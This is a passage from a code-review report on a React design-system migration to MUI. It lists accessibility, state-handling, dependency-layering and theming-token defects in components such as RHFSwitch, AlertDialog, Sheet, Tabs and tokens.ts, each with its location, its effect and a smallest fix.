- **Smallest fix:** Merge handlers: read the child's existing onClick/onXxx from its props and call both in the injected wrapper before/after setAnchorEl, mirroring how DropdownMenuItem already chains.

### [High] RHFSwitch silently drops all validation error messages  `error-handling` (CONFIRMED)
- **Where:** src/design-system/components/molecules/form/RHFSwitch.tsx:22-37
- **What breaks:** Confirmed. useController destructures only `{ field }` (line 22) — never `fieldState` — and the JSX renders only Switch + Label, no error path. Unlike RHFCheckbox (which at least renders fieldState.error.message), a required toggle like 'I accept the terms' that fails validation shows the user absolutely nothing: form refuses to submit, no visible reason, no AT announcement. A swallowed failure path.
- **Smallest fix:** Pull `fieldState` from useController and render the error (linked via aria-describedby / role=alert), mirroring RHFCheckbox/Field.

### [Medium] MultiSelect silently discards selected values not present in the current options  `ownership` (CONFIRMED)
- **Where:** src/design-system/components/molecules/Autocomplete.tsx:38,49
- **What breaks:** Confirmed. `value = options.filter(o => selected.includes(o.value))` (line 38). If `selected` holds ids not yet in `options` (async-loaded list, stale/removed option, value set before options arrive), those selections vanish from the UI, and the very next onChange emits `v.map(o => o.value)` (line 49) from only the visible subset — silently overwriting the caller's stored selection to drop the missing ids. A data-integrity loss the user never sees; it treats `options` as the source of truth when the caller's `selected` array is.
- **Smallest fix:** Preserve unknown selected ids (render as chips or keep them in the emitted value) rather than filtering them out, or surface a loading/error state until options are present.

### [Medium] RHFCheckbox error is neither associated with the control nor announced  `error-handling` (CONFIRMED)
- **Where:** src/design-system/components/molecules/form/RHFCheckbox.tsx:38-42
- **What breaks:** Confirmed. The error is a bare <Text> sibling (lines 38-42) with no id, no aria-describedby tying it to the checkbox, and no role="alert". Screen-reader users get no announcement on validation failure and no programmatic link between checkbox and message (WCAG 1.3.1 / 3.3.1). It hand-rolls exactly the wiring Field.tsx already provides (role=alert + aria-describedby), so the error is effectively invisible to AT.
- **Smallest fix:** Route checkbox+label+error through Field (or replicate its aria-describedby + role=alert wiring) instead of a bare error sibling.

### [Medium] HoverCard content is non-interactive and unreachable, contradicting its own a11y docstring  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/molecules/HoverCard.tsx:44-63,72
- **What breaks:** Confirmed. The Popover carries `sx={{ pointerEvents: 'none' }}` (line 72) and never re-enables pointer events on the content Box, so any link/button inside HoverCardContent cannot be clicked. onMouseLeave on the trigger closes immediately (line 58) with no enter-guard, so the pointer can never travel into the card. The docstring (lines 4-5) claims content is 'reachable by keyboard focus' but nothing focuses the content and onBlur closes it — the a11y promise is false and interactive hovercards do not work.
- **Smallest fix:** Re-enable pointerEvents:'auto' on the content Box, add a close-delay/enter-guard so the pointer can reach the card, and genuinely wire keyboard reachability if interactive content is intended.

### [Medium] Select.onValueChange force-casts multi-select arrays and numeric values to string  `other` (CONFIRMED)
- **Where:** src/design-system/components/molecules/Select.tsx:24-26
- **What breaks:** Confirmed. `onValueChange?.(event.target.value as string)` (line 25). With `multiple`, MUI's value is string[] cast to `string` and handed to callers typed for a string, so string ops throw or yield garbage; numeric MenuItem values are likewise mis-typed. Silent type corruption at the form boundary, invisible to TypeScript because of the cast.
- **Smallest fix:** Don't cast; pass event.target.value through with its real type (string | string[]), or expose separate single/multi handlers.

### [Medium] Popover and DropdownMenu ignore controlled open / onOpenChange  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/molecules/Popover.tsx:31; DropdownMenu.tsx:34
- **What breaks:** Confirmed. Both root components accept only `{ children }` (Popover.tsx:31, DropdownMenu.tsx:34) and hold open state purely in internal anchorEl. A migrated caller that opens the surface programmatically or reacts to close (close-on-route-change, open-from-parent-action) is silently ignored — the prop doesn't even compile through since it isn't in the type, and if spread it does nothing. The surface can't be driven or observed by its parent.
- **Smallest fix:** Accept optional open/onOpenChange and reconcile with internal anchorEl (controlled/uncontrolled), like Tabs does for value.

### [Medium] SaveStatus announces save FAILURES on a polite, non-alert live region  `error-handling` (CONFIRMED)
- **Where:** src/design-system/components/molecules/SaveStatus.tsx:43-44
- **What breaks:** Confirmed. The whole widget is `role="status" aria-live="polite"` (lines 43-44), including the error state ('Couldn't save'). A failed autosave is queued politely behind other announcements and may never reach a screen-reader user before they navigate away believing their work saved — real data loss on the unhappy path. A save failure is exactly the case that warrants an assertive alert.
- **Smallest fix:** Render the error state in an assertive region (role=alert / aria-live=assertive) while keeping saved/saving polite.

### [Medium] Field's aria wiring silently no-ops for anything but a single element child  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/molecules/Field.tsx:36-47
- **What breaks:** Confirmed. aria-describedby/aria-invalid are cloned onto the control only when `Children.count(children) === 1 && isValidElement(children)` (line 37). Wrap a fragment, an input+addon group, or two elements and the error/helper text renders but is orphaned — no association, no aria-invalid, no warning. The component looks accessible but isn't, and the failure is invisible in review.
- **Smallest fix:** Warn (dev-time) when children isn't a single element, or require the caller to pass the control's id explicitly so association doesn't depend on cloneElement succeeding.

### [Medium] Field passes aria-describedby/aria-invalid to the MUI OutlinedInput root, missing the real <input>  `other` (PLAUSIBLE)
- **Where:** src/design-system/components/molecules/Field.tsx:38-46 (via RHFTextField.tsx:42 / RHFTextarea.tsx:39, atoms/Input.tsx:15, atoms/Textarea.tsx:16)
- **What breaks:** Verified the chain: Field clones aria-describedby/aria-invalid onto its child; the child is atoms/Input or atoms/Textarea, both of which are a bare MUI OutlinedInput that spreads `{...props}` onto the InputBase root (Input.tsx:15, Textarea.tsx:16), NOT onto the inner <input>/<textarea> via inputProps/slotProps. MUI InputBase forwards arbitrary aria-* to the root wrapper div, so assistive tech reading the editable element does not receive the error association. Latent a11y gap: the error text exists but SRs don't tie it to the input. Marked PLAUSIBLE pending a DOM-level check of MUI's exact prop routing, but the wiring as written targets the wrong node.
- **Smallest fix:** Thread aria-describedby/aria-invalid through inputProps/slotProps.input in atoms/Input and atoms/Textarea rather than the OutlinedInput root, or have Field pass them via inputProps.

### [Medium] CharCountTextarea counter desyncs from a controlled value  `ownership` (CONFIRMED)
- **Where:** src/design-system/components/molecules/CharCountTextarea.tsx:32-46
- **What breaks:** Confirmed. `count` is seeded once from the initial value (lines 32-34) and only updated inside the component's own onChange (line 43). When the parent controls `value` and changes it programmatically (form reset, server prefill, external edit) without a keystroke, the displayed 'X/5000' keeps the stale count. Count and actual value become two sources of truth that drift, so the counter lies exactly near the limit where it matters.
- **Smallest fix:** Derive count from the effective value on render (useMemo over value ?? defaultValue) instead of holding it in separate state.

### [Medium] DropdownMenu compat surface is incomplete despite claiming to 'keep the shadcn compound API'  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/molecules/DropdownMenu.tsx:75-78
- **What breaks:** Confirmed. Only Trigger/Content/Item/Label/Separator are exported (lines 39-78). shadcn's DropdownMenuCheckboxItem, DropdownMenuRadioGroup/RadioItem, DropdownMenuSub/SubTrigger/SubContent, and DropdownMenuShortcut are absent. Any menu migrated mechanically that used checkable items, radio groups, submenus, or shortcut hints fails to compile or loses that behavior — directly contradicting the docstring's 'keeps the shadcn compound API' claim (lines 3-4).
- **Smallest fix:** Implement the missing sub-parts or drop the 'keeps the compound API' claim and document the reduced surface so callers know to refactor.

### [Medium] Trigger shims silently no-op the entire open behavior for multi-child or non-element triggers  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/molecules/DropdownMenu.tsx:41-49; Popover.tsx:38-46; HoverCard.tsx:46-62
- **What breaks:** Same silent-no-op pattern as Field, found while re-reading all three triggers. Each wraps its cloneElement in `if (Children.count(children) === 1 && isValidElement(children))` and otherwise falls through to `return <>{children}</>` with NO handler wiring at all. A trigger passed a fragment, two elements, or a bare string renders fine but can never open the menu/popover/hovercard — no error, no warning. This is not an edge case: wrapping a trigger in a <> or passing an icon+label pair is common, and the surface becomes permanently unopenable.
- **Smallest fix:** Warn (dev-time) when the trigger child isn't a single valid element, or wrap the children in a real focusable element that carries the open handler instead of returning a passthrough fragment.
- _added-in-verification_

### [Medium] Tabs destroys in-progress panel state on every tab switch (inactive panels unmount)  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/molecules/Tabs.tsx:65-68
- **What breaks:** TabsContent returns null for any non-active value (line 67), so inactive panels are fully unmounted, not hidden. Any uncommitted state inside a panel — a half-typed form, scroll position, focus, a loaded-but-unsaved editor — is destroyed the instant the user switches tabs and silently reset when they switch back. Because ResponsiveTabs re-exports these same components verbatim, every tabbed form/wizard in the app inherits the data-loss. Callers migrating from a shadcn setup that used forceMount get no equivalent and no warning.
- **Smallest fix:** Keep panels mounted and toggle visibility (hidden attribute / display:none) for the inactive ones, or expose a forceMount/keepMounted opt-in so panels holding editable state survive a tab switch.
- _added-in-verification_

### [Low] Alert collapses 'default' into 'info' and renders AlertDescription outside MUI's message slot  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/molecules/Alert.tsx:12,29-31
- **What breaks:** Confirmed. `default` maps to severity `info` (line 12), identical to explicit `info` — a neutral default alert renders info coloring and an info icon, indistinguishable from an info alert. AlertDescription is a bare <div> (lines 29-31); nested in MUI Alert it isn't placed in the Alert's semantic message region the shadcn compound implied, so the description's structure/semantics are lost.
- **Smallest fix:** Give 'default' a distinct neutral rendering (no severity / plain surface), and make AlertDescription contribute to the Alert message content rather than a raw div.

### [Low] Breadcrumb sub-part shims discard props and structure  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/molecules/Breadcrumb.tsx:15-28
- **What breaks:** Confirmed. BreadcrumbList and BreadcrumbItem render bare fragments (lines 15-16) that drop any className/aria-current/data-* a migrated caller passed, and BreadcrumbSeparator returns null (line 28). Mechanically migrated breadcrumbs that marked the current page via aria-current on BreadcrumbItem/Page, or styled items via className, silently lose that markup.
- **Smallest fix:** Have the shims render a real element (li/span) that forwards props, or document that these are no-ops so callers move aria-current onto BreadcrumbPage explicitly.

### [Low] SaveStatus becomes a dead-end 'Couldn't save' with no recovery when onRetry is omitted  `error-handling` (CONFIRMED)
- **Where:** src/design-system/components/molecules/SaveStatus.tsx:57-61
- **What breaks:** Confirmed. The Retry button renders only when state==='error' AND onRetry is provided (line 57). A caller that renders SaveStatus on error without wiring onRetry shows a failure message with no recover/retry affordance — the change is reported lost but nothing lets the user act. The component's shape invites this footgun.
- **Smallest fix:** Make onRetry required for the error path (or dev-warn when state can be 'error' without an onRetry) so a reported save failure always carries a recovery action.

### [Low] ConfirmDialog defaults to destructive styling, inverting the safe default  `other` (CONFIRMED)
- **Where:** src/design-system/components/molecules/ConfirmDialog.tsx:38,51-54
- **What breaks:** `destructive = true` is the default (line 38), so every ConfirmDialog renders its primary action in the destructive/red variant unless the caller remembers to pass destructive={false}. A benign confirmation ('Publish?', 'Send invite?') mechanically dropped in inherits alarming destructive styling, training users to dismiss the red-button pattern and eroding its signal for genuinely destructive actions. Safe defaults should be non-destructive; this defaults the dangerous way.
- **Smallest fix:** Default `destructive = false` so the destructive treatment is opt-in for the actions that actually warrant it.
- _added-in-verification_

---

## Design system: organisms, primitives & layout

### [High] Design system depends UP into app-level @/components for six organisms, inverting layering  `dependency` (CONFIRMED)
- **Where:** src/design-system/components/organisms/Calendar.tsx:8, Chart.tsx:8, Command.tsx:8, Toaster.tsx:10-11, DataTable.tsx:13, Table.tsx (family)
- **What breaks:** Verified: Calendar/Chart/Command each `export * from "@/components/ui/<x>"`, Toaster does `export { Toaster } from "@/components/ui/sonner"` and `export { toast } from "sonner"`, DataTable does `export { ThemedAgGrid ... } from "@/components/AgGrid"`. These are surfaced through `src/design-system/keep-lib.ts` (barrel line 176-181 defers them there). The dependency arrow points from the design system UP into the app's component layer — the reverse of UI->hooks->services->lib. A refactor or deletion in `@/components/ui/*` or `@/components/AgGrid` silently breaks `@/design-system/keep-lib` consumers; the DS cannot be extracted or reasoned about independently because its public surface is a passthrough to app code it is meant to sit beneath. Neither the ESLint governance (only `no-direct-mui`, which explicitly ignores `src/design-system/**`) nor arch-gate.config.json has any rule forbidding this upward import, so nothing stops it growing. Shipping to 767 users as the canonical surface with 'interim wrapper ... until teardown' comments conceding it is unfinished.
- **Smallest fix:** Move the themed implementations (calendar, chart, command, sonner Toaster, AgGrid wrapper) INTO the design-system package and have `@/components/ui/*` / `@/components/AgGrid` re-export from the DS, so the arrow points down. If teardown must be deferred, add an arch-gate rule (include src/design-system/**, forbid `from ['"]@/components/`) so no NEW upward imports appear.

### [High] App-wide claim 'imports UI ONLY from @/design-system (enforced by ESLint)' is false — 650 legacy imports across 166 files  `dependency` (CONFIRMED)
- **Where:** src/design-system/index.ts:2-4 (docstring) vs. actual imports across src/**; eslint.config.js:430-444
- **What breaks:** added-in-verification. The DS barrel docstring asserts 'The app imports UI ONLY from @/design-system (enforced by ESLint).' Grep found 650 `from "@/components/ui/..."` occurrences across 166 files (App.tsx, dozens of admin/*, auth/*, forms/*, dialogs, sheets). The only governance rule (`design-system/no-direct-mui`) forbids raw `@mui/material` imports and explicitly ignores `src/design-system/**` — it does NOTHING about `@/components/ui/*`. So the design system is not the single UI source at all: the overwhelming majority of the app still consumes the pre-migration shadcn/ui components directly. Any theming or behavior change made in the DS (e.g. the AlertDialog/Sheet rebuilds audited here) reaches almost none of these 166 files, so the migration produces two parallel UI stacks in production indefinitely, with the DS version being the minority. The 'enforced by ESLint' claim will mislead every future contributor into assuming coverage that does not exist.
- **Smallest fix:** Either add a `no-restricted-imports`/arch-gate rule that actually bans `@/components/ui/*` outside the DS and grandfather the 650 existing hits into arch-gate.waivers.json so the count can only shrink, or correct the docstring to state the truth (migration in progress, N files remain on the legacy path).

### [Medium] Two live import paths for the same component (DS keep-lib and legacy ui/*), neither lint-banned  `ownership` (CONFIRMED)
- **Where:** src/design-system/components/organisms/{Calendar,Chart,Command,Toaster}.tsx vs. still-present src/components/ui/{calendar,chart,command,sonner}.tsx
- **What breaks:** Confirmed the legacy files still exist (calendar.tsx, chart.tsx, command.tsx, sonner.tsx, alert-dialog.tsx, sheet.tsx, dialog.tsx all present) and the organisms merely re-export them, so every one can be imported two ways: `@/design-system/keep-lib` and `@/components/ui/<x>`. This is the 'never create a second way' drift. No ESLint rule bans `@/components/ui/*` imports (grep of eslint.config.js shows only `no-direct-mui`), so the second path is fully open. A future themed rebuild of (say) Chart in the DS will visibly diverge from callers still on `@/components/ui/chart`, producing two chart looks in prod with no single owner. For `toast`, sonner is re-exported directly so a third path (`import { toast } from "sonner"`) also works.
- **Smallest fix:** Pick one canonical source per component; re-export the legacy file FROM the DS and add a `no-restricted-imports` rule banning `@/components/ui/*` and direct `sonner` imports outside `src/design-system/**`.

### [Medium] Compound Trigger shims silently discard the child's existing onClick  `boundary` (CONFIRMED)
- **Where:** src/design-system/components/organisms/AlertDialog.tsx:63-66, Sheet.tsx:60-63
- **What breaks:** Verified: `cloneElement(children, { onClick: () => setOpen(true) })` overwrites the child's onClick with no merge, and also does not forward a ref. A consumer writing `<AlertDialogTrigger><Button onClick={trackDeleteClicked}>Delete</Button></AlertDialogTrigger>` loses `trackDeleteClicked` entirely — the analytics/side-effect never fires, silently, with no type error or warning. Radix's Trigger composes handlers via Slot; this shim replaces them. Blast radius: any trigger that also needed telemetry, form dirty-marking, or closing a parent menu on click is quietly broken. Note Button.tsx (lines 57-77) already ships an `asChild` slot shim that merges className and could have modeled handler composition, but this Trigger reused none of it.
- **Smallest fix:** Compose handlers and forward the ref: `onClick: (e) => { children.props.onClick?.(e); setOpen(true); }` plus `ref` merge.

### [Medium] Trigger silently no-ops on text or multi-child content — dead, unopenable trigger  `error-handling` (CONFIRMED)
- **Where:** src/design-system/components/organisms/AlertDialog.tsx:63-68, Sheet.tsx:60-65
- **What breaks:** Verified: guarded by `Children.count(children) === 1 && isValidElement(children)`; otherwise falls through to `return <>{children}</>` with NO click wiring. So `<SheetTrigger>Open</SheetTrigger>` (a plain string) or a two-element trigger renders normally but can never open the sheet/dialog, and nothing warns the developer. Invisible in code review; only caught if a human happens to click it in QA. This is a swallowed failure path — neither recovers, retries, nor reports (question 4).
- **Smallest fix:** Render a real handler for the fallback (a span/Slot with onClick) or `console.error` in dev when children is not a single valid element, matching Radix's asChild contract.

### [Medium] MUI-backed dialogs drop aria-labelledby/aria-describedby — unlabeled dialogs for screen readers  `boundary` (CONFIRMED)
- **Where:** src/design-system/components/organisms/AlertDialog.tsx:71-93, Dialog.tsx:16-42, Sheet.tsx:68-99
- **What breaks:** Verified: AlertDialogTitle/SheetTitle/DialogTitle are `<Text as="h2">` (Dialog wraps in MuiDialogTitle) with no `id`, and the descriptions are muted `<Text>` with no id. MuiDialog/MuiDrawer are rendered with no `aria-labelledby`/`aria-describedby` passed. The shadcn/Radix components these replace auto-associate title+description; here nothing does, so screen-reader users hear an unnamed 'dialog' with no announced purpose across confirmation and side-panel flows — a WCAG 4.1.2/1.3.1 regression. AlertDialogContent additionally passes `role="alertdialog"` directly to MuiDialog (line 74); MUI forwards unrecognized root props to the Modal container rather than the dialog Paper, so the role likely lands on the wrong node and does not override MUI's role="dialog" on the Paper.
- **Smallest fix:** Generate ids for Title/Description and pass `aria-labelledby`/`aria-describedby` to the MUI Dialog/Drawer via the open-state context; set role on the Paper via `slotProps.paper`/`PaperProps`, not the root.

### [Medium] Confirm/Cancel close the dialog unconditionally — destructive action can't hold open on failure  `error-handling` (CONFIRMED)
- **Where:** src/design-system/components/organisms/AlertDialog.tsx:101-104 (Action), 121-124 (Cancel), Sheet.tsx:111-114 (Close)
- **What breaks:** Verified: `onClick={(e) => { onClick?.(e); setOpen(false); }}` runs the consumer handler then closes synchronously. For an AlertDialog whose whole job is confirming destructive actions (delete a profile, remove a member), if the consumer's onClick kicks off an async mutation that later fails, the dialog is already gone — the user sees it vanish and assumes success while the delete errored. There is no way to keep it open pending the result (no await, no returned-false veto, no preventDefault contract). This defeats the confirmation gate on exactly the high-consequence flows it guards.
- **Smallest fix:** Let onClick optionally return a promise/false to defer or veto the close (`const r = await onClick?.(e); if (r !== false) setOpen(false);`), or don't auto-close Action and let the consumer close on success.

### [Medium] DS ConfirmDialog's `loading` prop is dead and its confirm is async-unsafe  `error-handling` (CONFIRMED)
- **Where:** src/design-system/components/molecules/ConfirmDialog.tsx:51-57 (built on AlertDialogAction)
- **What breaks:** added-in-verification. ConfirmDialog is the DS's canonical one-call confirmation and exposes a `loading` prop that sets `disabled={loading}` on the Action button. But AlertDialogAction closes the dialog synchronously the instant it is clicked (AlertDialog.tsx:101-104), and `onConfirm` is fire-and-forget with no await. So: (1) the `loading` spinner/disabled state can never actually render — the dialog is already unmounting; and (2) if `onConfirm` starts an async delete that fails, the dialog has closed and the user believes the destructive action succeeded. Every caller of the shared ConfirmDialog on a real (async) mutation inherits this silent success-on-failure. The prop's existence signals a safety the component does not provide.
- **Smallest fix:** Make ConfirmDialog own the async lifecycle: await onConfirm, keep the dialog open and show `loading` while it runs, close only on resolve, and surface the error on reject — or route it through the same 'return false to veto close' contract fixed on AlertDialogAction.

### [Low] Silent controlled/uncontrolled switching via `controlled == null`  `error-handling` (CONFIRMED)
- **Where:** src/design-system/components/organisms/AlertDialog.tsx:53-56, Sheet.tsx:50-53
- **What breaks:** Verified: `const open = controlled ?? internal;` and `if (controlled == null) setInternal(b);` recompute controlled-ness every render. If a consumer passes `open={someState}` where `someState` is `undefined` on first render then becomes a boolean (a common data-loading-gate pattern), the component silently flips from uncontrolled to controlled mid-life, desyncing internal state, with no React warning (unlike the standard controlled-input warning). Hard-to-reproduce flicker/stuck-open bugs.
- **Smallest fix:** Freeze controlled-ness once (`const isControlled = useRef(controlled !== undefined).current`) and warn in dev if `controlled` transitions between defined/undefined.

### [Low] Sheet uses 100vw width/maxWidth, forcing horizontal scroll when a scrollbar is present  `boundary` (CONFIRMED)
- **Where:** src/design-system/components/organisms/Sheet.tsx:70-74
- **What breaks:** Verified: `width = side === left|right ? { xs: "100vw", sm: 400 } : undefined` and the Box has `maxWidth: "100vw"`. `100vw` measures the full viewport including the vertical scrollbar gutter, so on desktop browsers that reserve scrollbar space a left/right sheet becomes wider than the usable viewport, introducing a horizontal scrollbar and body overflow. Affects every full-width mobile-breakpoint sheet on a scrollbar-reserving browser.
- **Smallest fix:** Use `width: { xs: "100%" }` / `100dvw`-aware values on the Drawer paper rather than `100vw`.

### [Low] AlertDialog Action defaults to destructive variant regardless of context  `boundary` (CONFIRMED)
- **Where:** src/design-system/components/organisms/AlertDialog.tsx:96 (and ConfirmDialog.tsx:38 `destructive = true`)
- **What breaks:** Verified: `AlertDialogAction({ variant = "destructive", ... })` and ConfirmDialog defaults `destructive = true`. Many confirmations are non-destructive ('Save changes?', 'Send invite?'), yet their primary confirm renders red/destructive unless every caller overrides. Miscommunicates severity to users on benign flows and contradicts the file's own stated UX intent that only the destructive path is styled destructive.
- **Smallest fix:** Default Action (and ConfirmDialog) to the primary/default variant; require callers to opt into `destructive` for destructive confirms.

### [Low] AlertDialog nests footer actions inside DialogContent, breaking MUI's action-area layout  `boundary` (CONFIRMED)
- **Where:** src/design-system/components/organisms/AlertDialog.tsx:75 (all children wrapped in MuiDialogContent) with AlertDialogFooter = MuiDialogActions (line 83)
- **What breaks:** Verified: `AlertDialogContent` renders `<MuiDialogContent>{children}</MuiDialogContent>`, so ALL children — including `AlertDialogFooter` (which is `MuiDialogActions`) — are nested inside a single MuiDialogContent. MUI expects DialogActions to be a sibling of DialogContent; nesting yields wrong padding, loses the bottom-aligned action-bar styling, and diverges from the Dialog organism (Dialog.tsx exposes Content and Footer as siblings). Two dialogs meant to look identical will not.
- **Smallest fix:** Render children directly in the MUI Dialog and let the consumer place Content and Footer as siblings, matching Dialog.tsx; or split Header/Body into Content and leave Footer outside it.

### [Low] Full MUI Table family exported as 'catalog parity' while DataTable is owner-locked — duplicate table mechanism  `over-engineering` (CONFIRMED)
- **Where:** src/design-system/components/organisms/Table.tsx:10-27 (barrel index.ts:218)
- **What breaks:** Verified: Table.tsx re-exports 10 MUI table sub-components including the interactive `TableSortLabel` and `TablePagination` 'for full catalog parity', while the file's own doc says the locked default for any data-rich/sortable/paginated table is AG Grid DataTable. This publishes a second, unmanaged table mechanism into the DS surface: a developer reaching for `TablePagination`/`TableSortLabel` will hand-roll sorting/pagination that DataTable already owns, producing duplicated table logic and divergent behavior — the fragmentation the repo forbids.
- **Smallest fix:** Drop the interactive parts (TableSortLabel, TablePagination, TableFooter) from the DS surface, keeping only the static/semantic parts; keep DataTable the single interactive-table owner.

### [Low] NoSsr primitive is a no-op in a client-only Vite SPA — misleading dead surface  `over-engineering` (PLAUSIBLE)
- **Where:** src/design-system/components/primitives/NoSsr.tsx:6 (barrel index.ts:225)
- **What breaks:** Verified the file re-exports MUI `NoSsr`. TFN is a Vite React SPA (wrangler.jsonc / Cloudflare Pages, no SSR framework present), so NoSsr — which defers rendering until the client — always renders its children immediately and does nothing. Publishing it as a DS primitive misleads developers into thinking there is an SSR boundary to reason about; any code written 'to be SSR-safe' around it guards a condition that cannot occur. Marked PLAUSIBLE only because SSR-absence is inferred from build config rather than a stated constraint.
- **Smallest fix:** Remove NoSsr from the DS primitive set and note in docs that the app is CSR-only.

### [Low] Layout Grid/Container/Stack are zero-value passthroughs hardcoding the app to MUI v7's Grid `size` API  `dependency` (CONFIRMED)
- **Where:** src/design-system/components/layout/Grid.tsx:18-20, Container.tsx:8-9, Stack.tsx:9-11
- **What breaks:** Verified: `Grid` is `<MuiGrid {...props}/>` with no normalization; its documented contract (`size={{ xs, sm, md }}`) is the MUI Grid v2 API, default in the installed `@mui/material` 7.3.11. The wrapper adds nothing but hardcodes the entire app's grid API to a specific MUI major with no adapter. MUI's Grid has churned across majors (Grid / Unstable_Grid2 / Grid2 / v7 default); if the default export or `size` prop shifts on a version bump, every `<Grid size={...}>` in the app breaks at once with zero insulation — defeating the only reason to wrap. Container/Stack are the same pure passthrough (Container only injects a default `maxWidth`).
- **Smallest fix:** Either delete these passthroughs and import MUI directly (own the coupling honestly), or make Grid actually normalize the `size` prop it documents so a future MUI Grid API change is absorbed in one file.

---

## Design system: theme, provider, tokens & tests

### [High] Brand color truth is a hand-maintained mirror of index.css with no sync guard  `ownership` (CONFIRMED)
- **Where:** src/design-system/theme/tokens.ts:1-100 (header comment 6-14 explicitly admits the mirror) vs src/index.css:110-294
- **What breaks:** tokens.ts re-types every brand hsl() by hand from index.css (LIGHT/DARK objects lines 52-98). The header declares index.css the source of truth 'during coexistence' but nothing enforces parity. The instant anyone edits --primary/--success/--warning/--tf-btn-* in index.css (or tokens.ts), MUI DS components and Tailwind/shadcn components render different brand colors on the same screen. The section ships a docs-drift guard (docs-coverage.test.ts) but NO test asserts TOKENS === the CSS custom-property values. The drift is invisible until a user notices two blues.
- **Smallest fix:** Add a vitest that parses :root/.dark in index.css and asserts every TOKENS value equals the matching --var, or generate tokens.ts from index.css at build; fail CI on drift.

### [High] Dark-mode link/primary color already drifts between DS tokens and index.css  `ownership` (PLAUSIBLE)
- **Where:** src/design-system/theme/tokens.ts:82 (DARK.primary.main = hsl(217,73,48)); src/index.css:233 (--primary-text: 217 91% 72%); consumed by MuiLink at src/design-system/theme/components.ts:244 and Button 'link' variant at :144
- **What breaks:** For dark mode index.css deliberately lifts link/accent text to --primary-text 217 91% 72% (verified comment at index.css:232 'lift to L 72% for >=7:1 text'), but the DS mirrored --primary (217 73% 48%) into primary.main and points MuiLink + the Button link variant at primary.main. So a DS <Link> and a Tailwind <a> on the same dark page render visibly different link colors — the DS one much dimmer. This is present divergence in the committed code, not hypothetical, proving the finding-1 mirror is already out of sync and unguarded. (Marked PLAUSIBLE only because it assumes Tailwind link text consumes --primary-text; the token divergence itself is confirmed.)
- **Smallest fix:** Add a mode-aware link/accent token mirroring --primary-text (72% dark) and use it for MuiLink and the Button link variant instead of primary.main; cover with the parity test from finding 1.

### [Medium] Shared design system imports app-layer ThemeProvider (dependency direction inverted)  `dependency` (CONFIRMED)
- **Where:** src/design-system/provider/DesignSystemProvider.tsx:18 (import { useTheme as useAppTheme } from "@/components/ThemeProvider")
- **What breaks:** A foundational shared module reaches UP into an app feature (src/components). The DS can no longer be extracted, reused, or tested in isolation, and any move/rename of ThemeProvider breaks the whole design system. The team already had to add a ThemeContext export (ThemeProvider.tsx:14, comment says it exists purely so 'non-app hosts... can supply a controlled theme value to DesignSystemProvider') — a workaround that documents the inversion rather than fixing it. The DS should own its mode input; the app should adapt to it.
- **Smallest fix:** Have DesignSystemProvider accept a `mode: 'light'|'dark'` prop (or read a DS-owned context); the app passes resolvedTheme in. Remove the @/components import from the DS.

### [Medium] docs-coverage.test.ts passes vacuously when paths/cwd are wrong (false-green guard)  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/__tests__/docs-coverage.test.ts:17 (ROOT=process.cwd()), 29-38 (walk returns [] if dir missing), 42-77 (all assertions expect(...).toEqual([]))
- **What breaks:** walk() returns [] for any non-existent directory and every assertion is `expect(missing).toEqual([])`. ROOT is process.cwd(), so if the suite runs from a different cwd, the folders are renamed, or the repo is moved in a monorepo, SRC_COMPONENTS/DEMOS/DOCS resolve wrong, sourceNames/demoNames/docNames all become empty, and ALL THREE tests pass while checking nothing. The one guard meant to stop docs<->code drift gives maximum false confidence exactly when the layout it depends on changes.
- **Smallest fix:** Assert inputs are non-empty first: expect(existsSync(SRC_COMPONENTS)).toBe(true) and expect(sourceNames.length).toBeGreaterThan(0) before the emptiness checks, so a mislocated run fails loudly.

### [Medium] Warning intention is white-on-amber, failing WCAG contrast, mirrored into DS tokens  `under-engineering` (PLAUSIBLE)
- **Where:** src/design-system/theme/tokens.ts:62 and :86 (warning.main hsl(38,92,50), contrastText hsl(0,0,100)); wired into palette at createAppTheme.ts:21; mirrors index.css:159-160 & 263-264 (--warning-foreground 0 0% 100%)
- **What breaks:** White text on amber (38 92% 50% ~ #f4a621) is ~2.1:1 — below AA 4.5:1 for text and below 3:1 for UI. Any filled warning surface (MUI Alert severity=warning in standard/filled variant, a Chip/Badge color=warning, or any component reading palette.warning.contrastText) renders effectively unreadable for low-vision users, in both light and dark. NOTE the first pass overstated the consumers: the DS defines no Button 'warning' variant and MuiAlert defaults to variant='outlined' (components.ts:235), so the defect is latent until a filled warning surface is used — but the token pairing is committed and wrong. A design system is exactly where this should be fixed once.
- **Smallest fix:** Set warning.contrastText to a dark ink (e.g. hsl(0,0,13)) or darken warning.main until white clears 4.5:1; add a contrast unit test over every {main,contrastText} pair in TOKENS.

### [Medium] Theme default applies the heavy stat-card glow skin to every MUI Card  `boundary` (CONFIRMED)
- **Where:** src/design-system/theme/components.ts:14-27 (statTokens) and 158-174 (MuiCard styleOverrides.root)
- **What breaks:** MuiCard.root hardcodes a 3px primary border, 40px asymmetric radius (borderTopLeftRadius 40 / borderBottomRightRadius 40), and a double inset glow (boxShadow from statTokens) as the GLOBAL default for ALL Cards. Any feature using <Card> as a plain content container gets an unexpected glowing, thick-bordered stat box. The stat-card treatment — a specific visual variant — leaks into the generic component's base style, so a neutral container is impossible without fighting the theme. Blast radius: every Card across the app.
- **Smallest fix:** Make plain Card the neutral default (paper bg, divider border, 6px radius) and move glow/asym-radius/3px-border into an opt-in variant (e.g. variant="stat").

### [Medium] Brand blues hardcoded as literals in components.ts (third and fourth copies)  `ownership` (CONFIRMED)
- **Where:** src/design-system/theme/components.ts:17-19 (border "hsl(209, 100%, 33%)", bg/glow rgba(0,86,167,...)) and :78 (hero hover "#4d8cff")
- **What breaks:** statTokens (light) re-inlines the light primary hsl(209,100%,33%) instead of reading the `t` tokens the components() function already receives (createAppTheme.ts:35 passes t), and the hero-variant hover uses a magic #4d8cff that exists in no token. So the same brand blue now lives in index.css, tokens.ts, AND inline here, and a hover blue lives nowhere reusable. Changing the brand primary means hunting all of them; miss one and Cards/hero buttons drift from Buttons. Directly multiplies finding 1's sync problem.
- **Smallest fix:** Drive statTokens.border and the hero hover from `t` (t.primary.main and a new token for the hover shade); delete the inline literals.
